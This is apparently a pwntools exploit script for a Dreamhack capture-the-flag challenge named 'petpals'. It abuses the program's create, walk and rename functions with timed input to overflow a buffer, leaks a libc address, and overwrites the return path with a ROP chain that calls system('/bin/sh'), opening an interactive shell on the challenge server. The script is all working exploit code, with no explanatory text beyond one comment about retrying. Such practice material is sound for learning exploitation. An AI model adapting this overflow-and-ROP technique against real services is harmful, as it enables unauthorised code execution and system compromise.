#!/usr/bin/env python3
from pwn import *
import time

PORT = 10703
HOST = "host3.dreamhack.games"
elf = context.binary = ELF('./petpals_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x000000000000144F
            brva 0x0000000000001875
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)
def s(dt): p.send(dt)
def sl(dt): p.sendline(dt)

def create(type, name):
    sla(b'> ', b'1')
    sla(b'type: ', type)
    sa(b'name: ', name)

def walk():
    sl(b'2')

def rename(name):
    sla(b'> ', b'3')
    sa(b'name: ', name)

create(b'dog', flat(b'A'*0x10, 0x200))
walk()
time.sleep(4.00)

create(b'hamster', b'B'*(0x10-2))
# GDB()
rename(b'X'*(0x40))

# input()
sla(b'> ', b'2')
p.recvuntil(b'X'*0x40)
libc.address = u64(p.recvn(6).ljust(8, b'\x00')) - 0x29d90
log.info(f'libc: {hex(libc.address)}')


sl(b'1')
sla(b'type: ', b'dog')
sa(b'name: ', flat(b'A'*0x10, 0x200))
walk()
time.sleep(4.00)
create(b'hamster', b'B'*(0x10-2))
# GDB()

pl = flat(
    b'A'*0x40,
    libc.address + 0x2a3e5 + 1,
    libc.address + 0x2a3e5,
    next(libc.search(b'/bin/sh')),
    libc.sym.system
    )

rename(pl)

# sla(b'>', b'4')
# sl(b'cat flag')
p.interactive()

# Trying this on the remote might fail due to a delay in sending. Pls resend the script a few times :)